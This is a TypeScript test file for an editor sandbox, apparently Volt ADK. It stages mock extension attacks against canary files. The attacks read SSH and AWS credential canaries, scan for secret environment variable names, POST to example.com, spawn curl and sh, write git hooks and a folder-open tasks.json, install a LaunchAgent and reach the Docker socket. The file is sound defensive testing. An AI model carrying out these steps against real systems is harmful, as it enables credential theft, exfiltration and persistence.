/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

/*
 * TEST ONLY. Mock attacks a malicious extension would try, to check that Volt's sandbox stops each
 * one and tells the user. Nothing here reads a real secret: the key and credentials it goes for
 * are canaries in a fake home folder, a read reports only whether it worked (never the contents),
 * and the hosts it "exfiltrates" to get the word `canary`.
 */

import * as childProcess from 'child_process';
import * as fs from 'fs';
import * as https from 'https';
import * as net from 'net';
import * as os from 'os';
import * as path from 'path';
import * as vscode from 'vscode';

export interface IAttackResult {
	readonly id: string;
	readonly what: string;
	/** `blocked`: it failed. `through`: it worked, which a sandbox must not allow. */
	readonly outcome: 'blocked' | 'through';
	/** The error code or a short reason; never file contents. */
	readonly detail: string;
	readonly ms: number;
}

function canaryHome(): string {
	const configured = vscode.workspace.getConfiguration('voltAgentLab').get<string>('testOnly.canaryHome');
	return configured && configured.trim() ? configured.trim() : path.join(os.homedir(), '.volt-e2e-canary-home');
}

function code(err: unknown): string {
	const e = err as { code?: string; message?: string; name?: string };
	return e?.code ?? e?.name ?? String(e?.message ?? err).slice(0, 120);
}

async function attempt(id: string, what: string, run: () => Promise<string>): Promise<IAttackResult> {
	const started = Date.now();
	try {
		const detail = await run();
		return { id, what, outcome: 'through', detail, ms: Date.now() - started };
	} catch (err) {
		return { id, what, outcome: 'blocked', detail: code(err), ms: Date.now() - started };
	}
}

/** A read that worked says so with its size only. */
async function readCanary(file: string): Promise<string> {
	const text = await fs.promises.readFile(file, 'utf8');
	return `read ${text.length} bytes${text.includes('CANARY') ? ' (the canary)' : ''}`;
}

/** Volt's network proxy answers a refused request itself (403, its own words): that is blocked, not through. */
function refusedByVolt(status: number | undefined, body: string): boolean {
	return status === 403 && /Volt/.test(body);
}

function post(url: string, body: string, timeoutMs = 8_000): Promise<string> {
	return new Promise((resolve, reject) => {
		const req = https.request(url, { method: 'POST', timeout: timeoutMs, headers: { 'content-type': 'text/plain' } }, res => {
			let text = '';
			res.setEncoding('utf8');
			res.on('data', chunk => text += chunk);
			res.on('end', () => refusedByVolt(res.statusCode, text)
				? reject(Object.assign(new Error(text.trim().slice(0, 120)), { code: 'VOLT_PROXY_403' }))
				: resolve(`HTTP ${res.statusCode}`));
		});
		req.on('error', reject);
		req.on('timeout', () => req.destroy(Object.assign(new Error('timed out'), { code: 'ETIMEDOUT' })));
		req.end(body);
	});
}

function run(command: string, args: string[], timeoutMs = 10_000): Promise<string> {
	return new Promise((resolve, reject) => {
		childProcess.execFile(command, args, { timeout: timeoutMs }, (err, stdout, stderr) => {
			if (err) {
				reject(Object.assign(new Error(String(stderr || err.message).trim().slice(0, 160)), { code: (err as { code?: string }).code ?? `exit ${String((err as { code?: unknown }).code)}` }));
			} else {
				resolve(stdout.trim().slice(0, 80));
			}
		});
	});
}

function dockerPing(socketPath: string): Promise<string> {
	return new Promise((resolve, reject) => {
		const socket = net.connect(socketPath);
		socket.setTimeout(5_000, () => socket.destroy(Object.assign(new Error('timed out'), { code: 'ETIMEDOUT' })));
		socket.once('error', reject);
		socket.once('connect', () => socket.write('GET /_ping HTTP/1.0\r\nHost: docker\r\n\r\n'));
		let reply = '';
		socket.on('data', data => reply += data.toString('utf8'));
		socket.once('end', () => resolve(reply.split('\r\n')[0] || 'connected'));
	});
}

/** Every attack once, now. `phase` names the run in the results (`now`, `delayed`). */
export async function runMockAttacks(phase: string): Promise<IAttackResult[]> {
	const home = canaryHome();
	const workspace = vscode.workspace.workspaceFolders?.[0]?.uri.fsPath;
	const results: IAttackResult[] = [];
	const add = async (id: string, what: string, fn: () => Promise<string>) => results.push(await attempt(`${phase}:${id}`, what, fn));

	await add('read-ssh-key', 'read a private SSH key (canary)', () => readCanary(path.join(home, '.ssh', 'id_ed25519')));
	await add('read-aws', 'read AWS credentials (canary)', () => readCanary(path.join(home, '.aws', 'credentials')));
	await add('read-real-ssh-dir', 'list the real ~/.ssh folder', async () => `${(await fs.promises.readdir(path.join(os.homedir(), '.ssh'))).length} entries`);
	await add('env-secrets', 'read secret environment variables', async () => {
		const names = Object.keys(process.env).filter(name => /TOKEN|SECRET|PASSWORD|API_?KEY|AWS_|GITHUB_|ANTHROPIC|OPENAI/i.test(name));
		if (!names.length) {
			throw Object.assign(new Error('none in reach'), { code: 'NONE' });
		}
		return `${names.length} names in reach: ${names.slice(0, 4).join(', ')}`;
	});
	await add('exfil-https', 'send data to a host nobody allowed (example.com)', () => post('https://example.com/volt-canary', 'canary=1'));
	await add('exfil-fetch', 'fetch() to a host nobody allowed (example.org)', async () => {
		const response = await fetch('https://example.org/volt-canary', { method: 'POST', body: 'canary=1', signal: AbortSignal.timeout(8_000) });
		const text = await response.text();
		if (refusedByVolt(response.status, text)) {
			throw Object.assign(new Error(text.trim().slice(0, 120)), { code: 'VOLT_PROXY_403' });
		}
		return `HTTP ${response.status}`;
	});
	await add('spawn-curl', 'start curl to a host nobody allowed', () => run('/usr/bin/curl', ['-sS', '-m', '8', '-o', '/dev/null', '-w', 'HTTP %{http_code}', 'https://example.com/volt-canary']));
	await add('spawn-sh-write-home', 'start sh to write in the home folder', () => run('/bin/sh', ['-c', `echo canary > "${path.join(os.homedir(), 'volt-lab-pwned.txt')}" && echo wrote`]));
	if (workspace) {
		await add('git-hook-fs', 'write .git/hooks/pre-commit (Node fs)', async () => {
			await fs.promises.mkdir(path.join(workspace, '.git', 'hooks'), { recursive: true });
			await fs.promises.writeFile(path.join(workspace, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\n# volt canary\n');
			return 'wrote';
		});
		await add('tasks-json-fs', 'write .vscode/tasks.json (Node fs)', async () => {
			await fs.promises.mkdir(path.join(workspace, '.vscode'), { recursive: true });
			await fs.promises.writeFile(path.join(workspace, '.vscode', 'tasks.json'), '{"version":"2.0.0","tasks":[{"label":"volt canary","type":"shell","command":"echo canary","runOptions":{"runOn":"folderOpen"}}]}\n');
			return 'wrote';
		});
		await add('git-hook-edit', 'create .git/hooks/post-merge (WorkspaceEdit, applied by the window)', async () => {
			const edit = new vscode.WorkspaceEdit();
			edit.createFile(vscode.Uri.file(path.join(workspace, '.git', 'hooks', 'post-merge')), { overwrite: true, contents: new TextEncoder().encode('#!/bin/sh\n# volt canary\n') });
			if (!await vscode.workspace.applyEdit(edit)) {
				throw Object.assign(new Error('not applied'), { code: 'REFUSED' });
			}
			return fs.existsSync(path.join(workspace, '.git', 'hooks', 'post-merge')) ? 'wrote' : 'applied, nothing on disk';
		});
		await add('tasks-json-edit', 'create .vscode/tasks.json (WorkspaceEdit, applied by the window)', async () => {
			const edit = new vscode.WorkspaceEdit();
			edit.createFile(vscode.Uri.file(path.join(workspace, '.vscode', 'tasks.json')), { overwrite: true, contents: new TextEncoder().encode('{"version":"2.0.0","tasks":[{"label":"volt canary","type":"shell","command":"echo canary","runOptions":{"runOn":"folderOpen"}}]}\n') });
			if (!await vscode.workspace.applyEdit(edit)) {
				throw Object.assign(new Error('not applied'), { code: 'REFUSED' });
			}
			return 'applied';
		});
		await add('git-hook-api', 'write .git/hooks/post-checkout (workspace.fs API)', async () => {
			await vscode.workspace.fs.writeFile(vscode.Uri.file(path.join(workspace, '.git', 'hooks', 'post-checkout')), new TextEncoder().encode('#!/bin/sh\n# volt canary\n'));
			return 'wrote';
		});
	}
	await add('launch-agent', 'install a LaunchAgent (persistence)', async () => {
		const dir = path.join(os.homedir(), 'Library', 'LaunchAgents');
		await fs.promises.writeFile(path.join(dir, 'com.volt-lab.canary.plist'), '<?xml version="1.0"?><plist version="1.0"><dict><key>Label</key><string>com.volt-lab.canary</string></dict></plist>\n');
		return 'wrote';
	});
	for (const socketPath of ['/var/run/docker.sock', path.join(os.homedir(), '.docker', 'run', 'docker.sock'), path.join(os.homedir(), '.orbstack', 'run', 'docker.sock')]) {
		if (fs.existsSync(socketPath)) {
			await add(`docker:${path.basename(path.dirname(path.dirname(socketPath)))}`, `reach the Docker socket (${socketPath.replace(os.homedir(), '~')})`, () => dockerPing(socketPath));
		}
	}
	const volt = (vscode as Partial<typeof vscode>).volt;
	if (volt) {
		// Through Volt's API: capabilities it never declared.
		await add('api-memory-write', 'write Volt memory (not declared)', async () => {
			await volt.memory.write({ name: 'volt-lab canary', description: 'canary', body: 'canary' });
			return 'wrote';
		});
		await add('api-automation', 'schedule an automation (not declared)', async () => `scheduled ${(await volt.automations.schedule({ name: 'volt-lab canary', instructions: 'canary', schedule: { type: 'hourly', minute: 0 } })).id}`);
	}
	return results;
}
